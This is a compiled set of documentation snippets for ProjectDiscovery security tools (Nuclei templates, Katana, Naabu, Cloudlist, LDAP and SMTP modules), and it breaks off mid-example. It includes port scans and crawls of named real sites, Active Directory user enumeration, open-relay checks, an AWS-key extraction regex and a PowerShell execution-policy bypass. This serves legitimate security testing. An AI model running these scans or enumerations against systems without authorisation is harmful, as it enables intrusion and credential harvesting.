SMTP protocol by creating a message and sending it to a specified host.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPClient.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.From('xyz@projectdiscovery.io');\nmessage.To('xyz2@projectdiscoveyr.io');\nmessage.Subject('hello');\nmessage.Body('hello');\nconst isSent = smtp.SendMail('acme.com', 25, message);\n```\n\n----------------------------------------\n\nTITLE: Basic Python Template with DSL Extractor\nDESCRIPTION: Simple code template that executes Python code to print \"Hello World\" and extracts the response using DSL. It's marked as self-contained for easier execution.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nid: code-template\n\n\ninfo:\n  name: example code template\n  author: pdteam\n  severity: info\n\n\nself-contained: true\ncode:\n  - engine:\n      - py\n      - python3\n    source: |\n      print(\"Hello World\")\n\n    extractors:\n      - type: dsl\n        dsl:\n          - response\n# digest: 4a0a0047304502204576db451ff35ea9a13c107b07a6d74f99fd9a78f5c2316cc3dece411e7d5a2b022100a36db96f2a56492147ca3e7de3c4d36b8e1361076a70924061790003958c4ef3:c40a3a04977cdbf9dca31c1002ea8279\n```\n\n----------------------------------------\n\nTITLE: Fingerprinting MySQL Server in JavaScript\nDESCRIPTION: Performs fingerprinting on a MySQL server and returns a MySQLInfo object containing server information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLClient.mdx#2025-04-12_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst info = mysql.FingerprintMySQL('acme.com', 3306);\nlog(to_json(info));\n```\n\n----------------------------------------\n\nTITLE: Negative Matcher in YAML\nDESCRIPTION: Shows how to use negative matching to exclude certain patterns from results.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  - type: word\n    words:\n      - \"PHPSESSID\"\n    part: header\n    negative: true\n```\n\n----------------------------------------\n\nTITLE: Using Dynamic Path Variables in Nuclei Template\nDESCRIPTION: Shows how to use dynamic path variables in a Nuclei template's HTTP path. Variables are replaced at runtime based on the target information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\npath: \"{{BaseURL}}/.git/config\"\n# This path will be replaced on execution with BaseURL\n# If BaseURL is set to  https://abc.com then the\n# path will get replaced to the following: https://abc.com/.git/config\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Example Output\nDESCRIPTION: Shows an example of running Katana against youtube.com and displays the expected output.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://youtube.com\n\n   __        __                \n  / /_____ _/ /____ ____  ___ _\n /  '_/ _  / __/ _  / _ \\/ _  /\n/_/\\_\\\\_,_/\\__/\\_,_/_//_/\\_,_/ v0.0.1                     \n\n      projectdiscovery.io\n\n[WRN] Use with caution. You are responsible for your actions.\n[WRN] Developers assume no liability and are not responsible for any misuse or damage.\nhttps://www.youtube.com/\nhttps://www.youtube.com/about/\nhttps://www.youtube.com/about/press/\nhttps://www.youtube.com/about/copyright/\nhttps://www.youtube.com/t/contact_us/\nhttps://www.youtube.com/creators/\nhttps://www.youtube.com/ads/\nhttps://www.youtube.com/t/terms\nhttps://www.youtube.com/t/privacy\nhttps://www.youtube.com/about/policies/\nhttps://www.youtube.com/howyoutubeworks?utm_campaign=ytgen&utm_source=ythp&utm_medium=LeftNav&utm_content=txt&u=https%3A%2F%2Fwww.youtube.com%2Fhowyoutubeworks%3Futm_source%3Dythp%26utm_medium%3DLeftNav%26utm_campaign%3Dytgen\nhttps://www.youtube.com/new\nhttps://m.youtube.com/\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/desktop_polymer.vflset/desktop_polymer.js\nhttps://www.youtube.com/s/desktop/4965577f/cssbin/www-main-desktop-home-page-skeleton.css\nhttps://www.youtube.com/s/desktop/4965577f/cssbin/www-onepick.css\nhttps://www.youtube.com/s/_/ytmainappweb/_/ss/k=ytmainappweb.kevlar_base.0Zo5FUcPkCg.L.B1.O/am=gAE/d=0/rs=AGKMywG5nh5Qp-BGPbOaI1evhF5BVGRZGA\nhttps://www.youtube.com/opensearch?locale=en_GB\nhttps://www.youtube.com/manifest.webmanifest\nhttps://www.youtube.com/s/desktop/4965577f/cssbin/www-main-desktop-watch-page-skeleton.css\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/web-animations-next-lite.min.vflset/web-animations-next-lite.min.js\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/custom-elements-es5-adapter.vflset/custom-elements-es5-adapter.js\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/webcomponents-sd.vflset/webcomponents-sd.js\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/intersection-observer.min.vflset/intersection-observer.min.js\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/scheduler.vflset/scheduler.js\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/www-i18n-constants-en_GB.vflset/www-i18n-constants.js\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/www-tampering.vflset/www-tampering.js\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/spf.vflset/spf.js\nhttps://www.youtube.com/s/desktop/4965577f/jsbin/network.vflset/network.js\nhttps://www.youtube.com/howyoutubeworks/\nhttps://www.youtube.com/trends/\nhttps://www.youtube.com/jobs/\nhttps://www.youtube.com/kids/\n```\n\n----------------------------------------\n\nTITLE: LDAP Advanced Search Operation\nDESCRIPTION: Performs an advanced LDAP search with custom scope, filters, and attributes.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst results = client.AdvancedSearch(ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false, '(objectClass=*)', ['cn', 'mail'], []);\n```\n\n----------------------------------------\n\nTITLE: Decoding Zulu Timestamp in LDAP\nDESCRIPTION: Shows how to decode a Zulu (UTC) timestamp string using the LDAP module. Accepts a timestamp in ISO 8601 format and returns a decoded string representation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst timestamp = ldap.DecodeZuluTimestamp('2021-08-25T10:00:00Z');\nlog(timestamp);\n```\n\n----------------------------------------\n\nTITLE: Checking for Telnet Server in JavaScript\nDESCRIPTION: This snippet demonstrates how to use the IsTelnet function from the telnet module to check if a host is running a Telnet server. It takes a host and port as parameters and returns an IsTelnetResponse object or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/telnet.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst telnet = require('nuclei/telnet');\nconst isTelnet = telnet.IsTelnet('acme.com', 23);\nlog(toJSON(isTelnet));\n```\n\n----------------------------------------\n\nTITLE: IsOracleResponse Interface Definition in TypeScript\nDESCRIPTION: Defines the IsOracleResponse interface with optional properties for Banner (string) and IsOracle (boolean). This interface is used as the return type for the IsOracle function.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/oracle.IsOracleResponse.mdx#2025-04-12_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\ninterface IsOracleResponse {\n  Banner?: string;\n  IsOracle?: boolean;\n}\n```\n\n----------------------------------------\n\nTITLE: Template Filtering Criteria - YAML Configuration\nDESCRIPTION: Filtering rules for recommended templates that exclude informational templates and potential false positives while focusing on exploitable vulnerabilities. The filters include severity levels, specific protocol types, and exclusion of certain tags.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/recommended.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n- All template severities except info\n- Type: http, tcp, or javascript\n- Exclusion of the tags: tech, dos, fuzz, creds-stuffing, token-spray, osint\n```\n\n----------------------------------------\n\nTITLE: DSL Matcher in YAML\nDESCRIPTION: Shows how to use DSL expressions for complex matching conditions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  - type: dsl\n    dsl:\n      - \"len(body)<1024 && status_code==200\" # Body length less than 1024 and 200 status code\n      - \"contains(toupper(body), md5(cookie))\" # Check if the MD5 sum of cookies is contained in the uppercase body\n```\n\n----------------------------------------\n\nTITLE: Checking POP3 Server Connection using JavaScript\nDESCRIPTION: Example demonstrating how to use the POP3 module to check if a server is running POP3 on port 110. The function returns an IsPOP3Response object containing the server banner and boolean verification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/pop3.IsPOP3Response.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst pop3 = require('nuclei/pop3');\nconst isPOP3 = pop3.IsPOP3('acme.com', 110);\nlog(toJSON(isPOP3));\n```\n\n----------------------------------------\n\nTITLE: Basic Nuclei Workflow Template\nDESCRIPTION: A simple workflow template that sequentially runs two technology detection templates for Jira and Confluence.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/workflows/examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: workflow-example\ninfo:\n  name: Test Workflow Template\n  author: pdteam\n\nworkflows:\n  - template: technologies/jira-detect.yaml\n  - template: technologies/confluence-detect.yaml\n```\n\n----------------------------------------\n\nTITLE: Specifying Variables for Dynamic Authentication in YAML\nDESCRIPTION: This YAML snippet demonstrates how to specify variables for dynamic authentication in Nuclei. It defines username and password variables that can be used in authentication templates.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/authenticated-scans.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nvariables:\n  - key: username\n    value: pdteam\n  - key: password\n    value: nuclei-fuzz\n```\n\n----------------------------------------\n\nTITLE: Naabu Port Scan with Specific Ports in Bash\nDESCRIPTION: Scan specific TCP and UDP ports on hackerone.com using Naabu. This example scans TCP ports 80, 443, 21-23, and UDP port 53.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nnaabu -p 80,443,21-23,u:53 -host hackerone.com\n```\n\n----------------------------------------\n\nTITLE: Connecting to Redis Server in JavaScript\nDESCRIPTION: Establishes a connection to a Redis server using host, port and password credentials. Returns boolean indicating success or null on failure.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/redis.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst redis = require('nuclei/redis');\nconst connected = redis.Connect('acme.com', 6379, 'password');\n```\n\n----------------------------------------\n\nTITLE: Joining Multiple LDAP Filters\nDESCRIPTION: Demonstrates combining multiple LDAP filters into a single filter expression. Takes multiple filter parameters and returns a combined filter string.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst filter = ldap.JoinFilters(ldap.FilterIsPerson, ldap.FilterAccountEnabled);\n```\n\n----------------------------------------\n\nTITLE: Checking KRB Error in Kerberos Response\nDESCRIPTION: The CheckKrbError function checks if the response bytes from the KDC are a KRBError. It takes a Uint8Array as input and returns either a Uint8Array or null.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.mdx#2025-04-12_snippet_1\n\nLANGUAGE: TypeScript\nCODE:\n```\n▸ **CheckKrbError**(`b`): `Uint8Array` | ``null``\n```\n\n----------------------------------------\n\nTITLE: XPath Matcher in YAML\nDESCRIPTION: Demonstrates using XPath queries to match XML and HTML responses.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nmatchers:\n  - type: xpath\n    part: body\n    xpath:\n      - \"/html/head/title[contains(text(), 'Example Domain')]\"\n```\n\n----------------------------------------\n\nTITLE: Testing SMTP Open Relay in JavaScript\nDESCRIPTION: Example demonstrating how to check if a host is an open relay by creating and sending a test message.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPClient.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst message = new smtp.SMTPMessage();\nmessage.From('xyz@projectdiscovery.io');\nmessage.To('xyz2@projectdiscoveyr.io');\nmessage.Subject('hello');\nmessage.Body('hello');\nconst isRelay = smtp.IsOpenRelay('acme.com', 25, message);\n```\n\n----------------------------------------\n\nTITLE: Cloudlist Go Library Implementation\nDESCRIPTION: Example Go code demonstrating how to use Cloudlist as a library to programmatically list cloud assets from specified providers\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: go\nCODE:\n```\npackage main\n\nimport (\n  \"context\"\n  \"log\"\n\n  \"github.com/projectdiscovery/cloudlist/pkg/inventory\"\n  \"github.com/projectdiscovery/cloudlist/pkg/schema\"\n)\n\nfunc main() {\n  inventory, err := inventory.New(schema.Options{\n    schema.OptionBlock{\"provider\": \"digitalocean\", \"digitalocean_token\": \"ec405badb974fd3d891c9223245f9ab5871c127fce9e632c8dc421edd46d7242\"},\n  })\n  if err != nil {\n    log.Fatalf(\"%s\\n\", err)\n  }\n\n  for _, provider := range inventory.Providers {\n    resources, err := provider.Resources(context.Background())\n    if err != nil {\n      log.Fatalf(\"%s\\n\", err)\n    }\n    for _, resource := range resources.Items {\n      _ = resource // Do something with the resource\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying AD Users with Non-Expiring Passwords - JavaScript LDAP\nDESCRIPTION: Retrieves all Active Directory users with passwords that never expire using FilterIsPerson and FilterDontExpirePassword filters. Returns a SearchResult object containing matching users.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst users = client.GetADUserWithNeverExpiringPasswords();\nlog(to_json(users));\n```\n\n----------------------------------------\n\nTITLE: Initializing MySQLClient in JavaScript\nDESCRIPTION: Creates a new instance of the MySQLClient class for interacting with MySQL databases.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst client = new mysql.MySQLClient;\n```\n\n----------------------------------------\n\nTITLE: Configuring WordPress Authentication Variables in YAML\nDESCRIPTION: This YAML configuration example shows how to set up template variables for WordPress authentication that can be reused across scans. It defines username and password variables with a scope limited to WordPress-related templates.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/parameters.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"WordPress Auth\"\ntype: template_variables\nvariables:\n  username: \"admin\"\n  password: \"secure_password\"\nscope: \"wordpress,wp-plugin\"\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Email Notifications in YAML\nDESCRIPTION: Email notification configuration using SMTP with server details, authentication, recipients and message formatting options.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp:\n  - id: email\n    smtp_server: mail.example.com\n    smtp_username: test@example.com\n    smtp_password: password\n    from_address: from@email.com\n    smtp_cc:\n      - to@email.com\n    smtp_format: \"{{data}}\"\n    subject: \"Email subject\"\n    smtp_html: false\n    smtp_disable_starttls: false\n```\n\n----------------------------------------\n\nTITLE: Engine-Specific Multiple Queries\nDESCRIPTION: Demonstrates running different optimized queries for each supported search engine to find Jira instances.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nuncover -shodan 'http.component:\"Atlassian Jira\"' -censys 'services.software.product=`Jira`' -fofa 'app=\"ATLASSIAN-JIRA\"' -quake 'Jira' -hunter 'Jira' -zoomeye 'app:\"Atlassian JIRA\"' -netlas 'jira' -criminalip 'Jira'\n```\n\n----------------------------------------\n\nTITLE: Defining Regex Extractor in YAML for Nuclei\nDESCRIPTION: Example of a regex extractor to extract data from the HTTP response body using a regular expression pattern.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/extractors.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nextractors:\n  - type: regex # type of the extractor\n    part: body  # part of the response (header,body,all)\n    regex:\n      - \"(A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}\"  # regex to use for extraction.\n```\n\n----------------------------------------\n\nTITLE: Initializing SMB Client in JavaScript\nDESCRIPTION: Creates a new instance of the SMB client for interacting with SMB servers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SMBClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst smb = require('nuclei/smb');\nconst client = new smb.SMBClient();\n```\n\n----------------------------------------\n\nTITLE: Running Katana with JavaScript Crawling\nDESCRIPTION: Illustrates how to enable JavaScript file parsing and crawling of endpoints discovered in JavaScript files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -jc\n```\n\n----------------------------------------\n\nTITLE: Taking Screenshots in Nuclei Headless Protocol\nDESCRIPTION: This snippet shows how to use the 'screenshot' action to capture a screenshot of the current page and save it to a specified location. It includes an option for full-page screenshots.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\naction: screenshot\nargs: \n  to: /root/test/screenshot-web\n  fullpage: true\n```\n\n----------------------------------------\n\nTITLE: Using interactsh-client with Notify\nDESCRIPTION: This snippet shows how to pipe the output of interactsh-client to the 'notify' tool for sending real-time interaction notifications to supported platforms.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/running.mdx#2025-04-12_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\ninteractsh-client | notify\n```\n\n----------------------------------------\n\nTITLE: PowerShell Template with Custom Execution Policy and Pattern\nDESCRIPTION: Complete template for executing PowerShell code with execution policy bypass and custom pattern settings. Includes a word matcher to validate the expected output.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nid: ps1-code-snippet\n\ninfo:\n  name: ps1-code-snippet\n  author: pdteam\n  severity: info\n  description: |\n    ps1-code-snippet\n  tags: code\n\ncode:\n  - engine:\n      - powershell\n      - powershell.exe\n    args:\n      - -ExecutionPolicy\n      - Bypass\n      - -File\n    pattern: \"*.ps1\"\n    source: |\n      $stdin = [Console]::In\n      $line = $stdin.ReadLine()\n      Write-Host \"hello from $line\"\n    \n    matchers:\n      - type: word\n        words:\n          - \"hello from input\"\n# digest: 4a0a00473045022100eb01da6b97893e7868c584f330a0cd52df9bddac005860bb8595ba5b8aed58c9022050043feac68d69045cf320cba9298a2eb2e792ea4720d045d01e803de1943e7d:4a3eb6b4988d95847d4203be25ed1d46\n```\n\n----------------------------------------\n\nTITLE: Matchers with AND Condition\nDESCRIPTION: This template shows how to use matchers with AND condition in a Nuclei template. It performs a GET request and checks for multiple conditions in both headers and body that must be satisfied.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http-examples.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: matchers-conditions\n\ninfo:\n  name: Test HTTP Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}\"\n\n    matchers:\n      - type: word\n        words:\n          - \"X-Powered-By: PHP\"\n          - \"PHPSESSID\"\n        condition: and\n        part: header\n\n      - type: word\n        words:\n          - \"PHP\"\n        part: body\n```\n\n----------------------------------------\n\nTITLE: Listing Files in a Directory with Nuclei fs Module\nDESCRIPTION: Lists only files in a specified directory using the ListDir function with 'file' as the itemType parameter. Returns an array of filenames or null if the operation fails.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/fs.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst fs = require('nuclei/fs');\n// this will only return files in /tmp directory\nconst files = fs.ListDir('/tmp', 'file');\n```\n\n----------------------------------------\n\nTITLE: LDAP Authentication\nDESCRIPTION: Authenticates a user against the LDAP server using username and password.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nclient.Authenticate('user', 'password');\n```\n\n----------------------------------------\n\nTITLE: Advanced DSL Filtering Examples in Katana\nDESCRIPTION: Collection of examples showing how to use DSL-based expressions for advanced URL filtering and matching.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_27\n\nLANGUAGE: shell\nCODE:\n```\nkatana -u https://www.hackerone.com -mdc 'status_code == 200'\nkatana -u https://www.hackerone.com -mdc 'contains(endpoint, \"default\") && status_code != 403'\nkatana -u https://www.hackerone.com -mdc 'contains(to_lower(technologies), \"php\")'\nkatana -u https://www.hackerone.com -fdc 'contains(to_lower(technologies), \"cloudflare\")'\n```\n\n----------------------------------------\n\nTITLE: Basic DNS Block Structure in YAML\nDESCRIPTION: Shows the basic structure for starting DNS requests in a Nuclei template.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ndns:\n```\n\n----------------------------------------\n\nTITLE: Basic Cloudlist Usage with AWS/GCP Providers\nDESCRIPTION: Example showing basic Cloudlist execution with AWS and GCP providers, displaying discovered assets including hostnames and IPs\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/running.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\ncloudlist -provider aws,gcp\n```\n\n----------------------------------------\n\nTITLE: Initializing LDAP Client and Fetching AD Users\nDESCRIPTION: Example showing how to create an LDAP client connection and retrieve Active Directory users. The code demonstrates instantiating a client with LDAP server URL and domain name, then fetching and logging user information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.ADObject.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst users = client.GetADUsers();\nlog(to_json(users));\n```\n\n----------------------------------------\n\nTITLE: Performing LDAP Search Query in JavaScript\nDESCRIPTION: Example demonstrating how to use the LDAP client to perform a search operation. Creates a new LDAP client connection and executes a search query with specific attributes to retrieve.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.SearchResult.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst results = client.Search('(objectinterface=*)', 'cn', 'mail');\n```\n\n----------------------------------------\n\nTITLE: Listing All Items in a Directory with Nuclei fs Module\nDESCRIPTION: Lists both files and directories in a specified directory using the ListDir function without specifying an itemType. Returns an array of item names or null if the operation fails.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/fs.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst fs = require('nuclei/fs');\n// when no itemType is provided, it will return both files and directories\nconst items = fs.ListDir('/tmp');\n```\n\n----------------------------------------\n\nTITLE: Initializing Oracle Client\nDESCRIPTION: Example showing how to import and instantiate the Oracle client class.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/oracle.OracleClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst oracle = require('nuclei/oracle');\nconst client = new oracle.Client();\n```\n\n----------------------------------------\n\nTITLE: Installing Nuclei using Docker\nDESCRIPTION: This command pulls the latest Nuclei Docker image. Specific usage instructions for Docker can be found in the running section.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/install.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ndocker pull projectdiscovery/nuclei:latest\n```\n\n----------------------------------------\n\nTITLE: Defining Dynamic Extractor in YAML for Nuclei\nDESCRIPTION: Example of a dynamic extractor named 'api' to capture a regex-based pattern from the response, which can be used in subsequent requests.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/extractors.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n    extractors:\n      - type: regex\n        name: api\n        part: body\n        internal: true # Required for using dynamic variables\n        regex:\n          - \"(?m)[0-9]{3,10}\\\\.[0-9]+\"\n```\n\n----------------------------------------\n\nTITLE: Initializing MySQLOptions for MySQL Connection in JavaScript\nDESCRIPTION: This snippet demonstrates how to create and configure a MySQLOptions object for connecting to a MySQL database. It sets the Host and Port properties.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLOptions.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst mysql = require('nuclei/mysql');\nconst options = new mysql.MySQLOptions();\noptions.Host = 'acme.com';\noptions.Port = 3306;\n```\n\n----------------------------------------\n\nTITLE: Using dnsx as a Library in Go\nDESCRIPTION: Example of using dnsx as a library in Go programs, demonstrating DNS lookup and query operations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/dnsx/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: go\nCODE:\n```\npackage main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/projectdiscovery/dnsx/libs/dnsx\"\n)\n\nfunc main() {\n\t// Create DNS Resolver with default options\n\tdnsClient, err := dnsx.New(dnsx.DefaultOptions)\n\tif err != nil {\n\t\tfmt.Printf(\"err: %v\\n\", err)\n\t\treturn\n\t}\n\n\t// DNS A question and returns corresponding IPs\n\tresult, err := dnsClient.Lookup(\"hackerone.com\")\n\tif err != nil {\n\t\tfmt.Printf(\"err: %v\\n\", err)\n\t\treturn\n\t}\n\tfor idx, msg := range result {\n\t\tfmt.Printf(\"%d: %s\\n\", idx+1, msg)\n\t}\n\n\t// Query\n\trawResp, err := dnsClient.QueryOne(\"hackerone.com\")\n\tif err != nil {\n\t\tfmt.Printf(\"err: %v\\n\", err)\n\t\treturn\n\t}\n\tfmt.Printf(\"rawResp: %v\\n\", rawResp)\n\n\tjsonStr, err := rawResp.JSON()\n\tif err != nil {\n\t\tfmt.Printf(\"err: %v\\n\", err)\n\t\treturn\n\t}\n\tfmt.Println(jsonStr)\n\n\treturn\n}\n```\n\n----------------------------------------\n\nTITLE: Sending Hex Encoded Data in Nuclei Network Template\nDESCRIPTION: Demonstrates how to send hex encoded text that will be decoded before sending. This allows for sending binary or non-printable data.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ninputs:\n  - data: \"50494e47\"\n    type: hex\n  - data: \"\\r\\n\"\n```\n\n----------------------------------------\n\nTITLE: Hex-Encoded Network Request Template in YAML\nDESCRIPTION: Template using hex-encoded data for network requests, demonstrating how to send and match hex-encoded content with type and encoding specifications.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network-examples.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: hex-network-request\n\ninfo:\n  name: Hex Input Network Request\n  author: pdteam\n  severity: info\n\ntcp:\n  - host: \n      - \"{{Hostname}}\"\n    inputs:\n      - data: \"50494e47\"\n        type: hex\n      - data: \"\\r\\n\"\n        \n    read-size: 4\n    matchers:\n      - type: word\n        part: data\n        encoding: hex\n        words:\n          - \"504f4e47\"\n```\n\n----------------------------------------\n\nTITLE: Using Katana as a Go Library\nDESCRIPTION: Example implementation showing how to use Katana as a library in Go, including configuration of crawler options and execution\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_33\n\nLANGUAGE: go\nCODE:\n```\npackage main\n\nimport 